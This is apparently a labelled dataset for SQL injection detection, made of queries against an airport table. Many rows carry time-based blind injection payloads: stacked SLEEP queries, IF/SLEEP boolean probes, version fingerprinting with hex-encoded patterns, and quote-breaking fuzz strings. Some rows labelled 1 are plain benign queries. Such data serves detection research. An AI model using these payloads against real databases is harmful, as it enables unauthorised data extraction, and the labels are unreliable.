full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),5384)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),4375)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((3983=3983/* NoValue */),SLEEP(1),3983)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((6053=6053/*!80300 AND 1413=5256*/),SLEEP(1),6053)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((2858=2858/*!80302 AND 4489=5548*/),SLEEP(1),2858)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"",.((.',)("" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US'LPbCmb<'"">PTarrp"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US');SELECT SLEEP(5)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US';SELECT SLEEP(5)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT SLEEP(5)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT SLEEP(0)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT SLEEP(5)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((44=44),SLEEP(5),9016)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((44=78),SLEEP(5),6274)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((44=96),SLEEP(5),4991)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((96=78),SLEEP(5),4470)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((78=78),SLEEP(5),6345)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((96 78),SLEEP(5),8342)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((39=39),SLEEP(5),4020)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((39=71),SLEEP(5),5366)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((39=79),SLEEP(5),4313)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((79=71),SLEEP(5),6001)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((71=71),SLEEP(5),1117)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((79 71),SLEEP(5),8468)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((23=23),SLEEP(5),9331)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((23=71),SLEEP(5),9184)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((23=72),SLEEP(5),5667)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((72=71),SLEEP(5),7340)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((71=71),SLEEP(5),6917)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((72 71),SLEEP(5),5196)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((20=20),SLEEP(5),2418)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((20=51),SLEEP(5),1015)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((20=93),SLEEP(5),8600)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((93=51),SLEEP(5),8334)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((51=51),SLEEP(5),6365)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((93 51),SLEEP(5),3454)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((55=55),SLEEP(5),9683)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((55=68),SLEEP(5),2557)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((55=98),SLEEP(5),4234)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((98=68),SLEEP(5),8662)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((68=68),SLEEP(5),1075)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((98 68),SLEEP(5),3626)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((7032=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                7032),SLEEP(5),9950)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((1057>1056),SLEEP(5),5514)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),1897)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),9104)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),6369)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),4460)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),9235)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),6577)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),3645)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),8930)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((6118=6118/* NoValue */),SLEEP(1),6118)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((8176=8176/*!80300 AND 2873=6865*/),SLEEP(1),8176)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((7351=7351/*!80302 AND 4644=9975*/),SLEEP(1),7351)#"" LIMIT 5",1,airport-S5,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US))'((.(""()""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US'IeYIDO<'"">ZnWjrl""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US');SELECT SLEEP(5)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US';SELECT SLEEP(5)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT SLEEP(5)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT SLEEP(0)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT SLEEP(5)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((15=15),SLEEP(5),4399)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((15=29),SLEEP(5),1203)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((15=38),SLEEP(5),1619)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((38=29),SLEEP(5),8620)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((29=29),SLEEP(5),3124)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((38 29),SLEEP(5),7807)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((12=12),SLEEP(5),7258)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((12=61),SLEEP(5),2707)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((12=92),SLEEP(5),1094)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((92=61),SLEEP(5),8166)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((61=61),SLEEP(5),1581)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((92 61),SLEEP(5),4492)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((11=11),SLEEP(5),8024)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((11=35),SLEEP(5),5201)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((11=38),SLEEP(5),9661)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((38=35),SLEEP(5),2969)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((35=35),SLEEP(5),2019)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((38 35),SLEEP(5),9759)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((48=48),SLEEP(5),2785)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((48=72),SLEEP(5),6257)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((48=77),SLEEP(5),3662)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((77=72),SLEEP(5),8478)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((72=72),SLEEP(5),4233)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((77 72),SLEEP(5),9144)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((21=21),SLEEP(5),3220)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((21=63),SLEEP(5),2257)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((21=94),SLEEP(5),4992)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((94=63),SLEEP(5),9064)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((63=63),SLEEP(5),9258)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((94 63),SLEEP(5),3458)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((2135=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2135),SLEEP(5),1272)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((8960>8959),SLEEP(5),9388)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),6550)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),6113)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),6486)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),8773)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),4605)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),2678)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),5046)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),9497)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((7991=7991/* NoValue */),SLEEP(1),7991)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((7455=7455/*!80300 AND 3213=6095*/),SLEEP(1),7455)#""",1,airport-S6,Unknown,Unknown
"SELECT id, ident, name FROM airport WHERE iso_country = ""US"";SELECT IF((3298=3298/*!80302 AND 9593=2702*/),SLEEP(1),3298)#""",1,airport-S6,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip.(),(('""))""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip'TVCdnM<'"">kRoZbg""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip);SELECT SLEEP(5)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip');SELECT SLEEP(5)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip';SELECT SLEEP(5)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT SLEEP(5)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT SLEEP(0)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT SLEEP(5)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((38=38),SLEEP(5),2968)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((38=52),SLEEP(5),2550)#""",1,airport-S7,Unknown,Unknown
"SELECT id FROM airport WHERE name = ""Pumpuentza Airstrip"";SELECT IF((38=88),SLEEP(5),6667)#""",1,airport-S7,Unknown,Unknown
